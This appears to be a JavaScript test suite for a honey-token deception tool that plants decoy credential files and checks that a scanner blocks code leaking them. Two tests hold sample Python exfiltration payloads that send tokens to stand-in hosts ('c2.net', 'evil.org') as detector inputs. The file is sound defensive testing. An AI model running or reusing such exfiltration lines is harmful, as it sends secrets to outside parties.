/**
 * Honey-Token Active Deception Chamber Test Suite
 * test/deception.test.js
 */

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

const { DeceptionChamber } = require('../src/threats/deception');
const { ThreatHunter } = require('../src/threats/hunter');

describe('Feature: Honey-Token Active Deception Chamber', () => {
  let tempDir;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sentinel-deception-test-'));
  });

  afterEach(() => {
    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch {}
  });

  it('Plants synthetic honey-token decoys with 0600 POSIX permissions', () => {
    const chamber = new DeceptionChamber({ workspaceRoot: tempDir });
    const planted = chamber.plantDecoys(['aws', 'stripe']);

    assert.strictEqual(planted.length, 2);
    const awsFile = path.join(tempDir, 'aws_credentials.ini');
    const stripeFile = path.join(tempDir, 'stripe_vault.env');

    assert.ok(fs.existsSync(awsFile));
    assert.ok(fs.existsSync(stripeFile));

    const stat = fs.statSync(awsFile);
    const mode = stat.mode & 0o777;
    assert.strictEqual(mode, 0o600, 'Decoy files must have owner-only 0600 permissions');

    const status = chamber.getStatus();
    assert.strictEqual(status.activeCount, 2);
  });

  it('Catches raw honeytoken exfiltration and generates HONEY-001 critical threat', () => {
    const chamber = new DeceptionChamber({ workspaceRoot: tempDir });
    chamber.plantDecoys(['stripe']);

    const hunter = new ThreatHunter({ workspaceRoot: tempDir });
    const state = chamber.loadState();
    const token = state.decoys['stripe_vault.env'].canary.token;

    const payload = `import urllib.request\nsecrets = "${token}"\nurllib.request.urlopen("https://c2.net?leak=" + secrets)\n`;
    const res = hunter.scan(payload, 'exfil.py');

    assert.strictEqual(res.verdict, 'BLOCKED');
    assert.strictEqual(res.riskScore, 100);
    assert.strictEqual(res.threats[0].id, 'HONEY-001');
    assert.ok(res.threats[0].detail.includes('stripe_vault.env'));
  });

  it('Catches Base64-encoded honeytoken exfiltration streams', () => {
    const chamber = new DeceptionChamber({ workspaceRoot: tempDir });
    chamber.plantDecoys(['aws']);

    const hunter = new ThreatHunter({ workspaceRoot: tempDir });
    const state = chamber.loadState();
    const b64Token = state.decoys['aws_credentials.ini'].canary.representations.base64;

    const payload = `import requests\nencoded = "${b64Token}"\nrequests.post("https://evil.org/collect", data={"key": encoded})\n`;
    const res = hunter.scan(payload, 'script.py');

    assert.strictEqual(res.verdict, 'BLOCKED');
    assert.strictEqual(res.riskScore, 100);
    assert.ok(res.threats[0].detail.includes('base64 encoding'));
  });

  it('Safely cleans up planted decoy files', () => {
    const chamber = new DeceptionChamber({ workspaceRoot: tempDir });
    chamber.plantDecoys(['all']);

    assert.ok(fs.existsSync(path.join(tempDir, 'aws_credentials.ini')));
    assert.ok(fs.existsSync(path.join(tempDir, 'stripe_vault.env')));
    assert.ok(fs.existsSync(path.join(tempDir, 'github_tokens.json')));

    const removed = chamber.cleanDecoys();
    assert.strictEqual(removed.length, 3);
    assert.strictEqual(fs.existsSync(path.join(tempDir, 'aws_credentials.ini')), false);
  });
});
